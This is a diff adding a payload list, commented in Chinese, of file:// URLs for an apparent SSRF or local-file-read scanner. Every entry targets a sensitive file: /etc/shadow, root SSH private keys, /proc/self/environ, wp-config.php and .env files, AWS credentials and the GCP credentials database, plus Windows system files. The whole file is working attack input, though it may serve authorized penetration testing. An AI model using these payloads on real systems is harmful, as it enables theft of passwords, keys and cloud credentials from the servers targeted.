@@ -1,0 +1,79 @@
+# 文件读取 Payload
+# 使用 file:// 协议读取本地文件
+# 扫描会自动跳过空格和注释
+
+# ========== Linux 系统文件 ==========
+# 用户信息
+file:///etc/passwd
+file:///etc/shadow
+file:///etc/group
+
+# 系统配置
+file:///etc/hosts
+file:///etc/hostname
+file:///etc/issue
+file:///etc/resolv.conf
+file:///etc/network/interfaces
+
+# SSH 相关
+file:///root/.ssh/id_rsa
+file:///root/.ssh/authorized_keys
+file:///home/user/.ssh/id_rsa
+
+# 进程信息
+file:///proc/self/environ
+file:///proc/self/cmdline
+file:///proc/self/status
+file:///proc/self/fd/0
+file:///proc/version
+file:///proc/cpuinfo
+
+# 系统日志
+file:///var/log/apache2/access.log
+file:///var/log/nginx/access.log
+file:///var/log/mysql/error.log
+file:///var/log/auth.log
+
+# 应用配置
+file:///etc/nginx/nginx.conf
+file:///etc/apache2/apache2.conf
+file:///etc/mysql/my.cnf
+
+# ========== Windows 系统文件 ==========
+# 系统配置
+file:///c:/windows/win.ini
+file:///c:/windows/system32/drivers/etc/hosts
+file:///c:/windows/system.ini
+file:///c:/boot.ini
+
+# 用户文件
+file:///c:/users/administrator/desktop/desktop.ini
+file:///c:/documents and settings/administrator/desktop/desktop.ini
+
+# ========== Web 应用文件 ==========
+# PHP 配置
+file:///etc/php/php.ini
+file:///usr/local/etc/php/php.ini
+
+# 应用日志
+file:///var/www/html/error.log
+file:///var/log/httpd/error_log
+
+# 数据库配置
+file:///var/www/html/config.php
+file:///var/www/html/wp-config.php
+file:///var/www/html/.env
+
+# ========== 容器相关 ==========
+file:///proc/1/cgroup
+file:///proc/self/cgroup
+file:///.dockerenv
+
+# ========== 云服务配置 ==========
+# AWS
+file:///root/.aws/credentials
+file:///root/.aws/config
+
+# GCP
+file:///root/.config/gcloud/credentials.db
+
